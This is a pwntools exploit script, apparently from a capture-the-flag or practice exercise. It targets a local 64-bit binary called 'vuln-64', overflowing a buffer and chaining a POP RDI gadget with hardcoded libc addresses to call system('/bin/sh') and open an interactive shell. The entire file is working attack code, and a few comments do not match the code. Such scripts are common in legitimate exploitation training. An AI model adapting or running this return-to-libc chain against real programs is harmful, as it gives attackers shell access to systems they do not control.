#!/usr/bin/python3

from pwn import *

#REMOTE = True      			# test remote
REMOTE =False       			# test local

elf = context.binary = ELF('./vuln-64')

if REMOTE :
    #p = remote('REMOTEIP',PORT) 	# test remote
    p = remote('',PORT)
else:
	p = process('./vuln-64')

#========= exploit here ================

libc_base = 0x7ffff7dcf000		# ldd vuln-64
system = libc_base + 0x49de0		# readelf -s /usr/lib/libc.so.6 | grep system
binsh = system + 0x18bb62		# strings -a -t x /usr/lib32/libc.so.6 | grep /bin/sh

POP_RDI = 0x4011cb

payload = b'A' * 72			# junk (0x48 + 0x4 vuln function)
payload += p64(POP_RDI)			# ROPgadget --binary vuln-64 | grep rdi
payload += p64(binsh)			# pointer to command: /bin.sh
payload += p64(system)			# location of system
payload += p64(0x0)			# return Pointer - not important once we get the shell

p.recvline()
p.sendline(payload)

#========= interactive ====================
p.interactive()
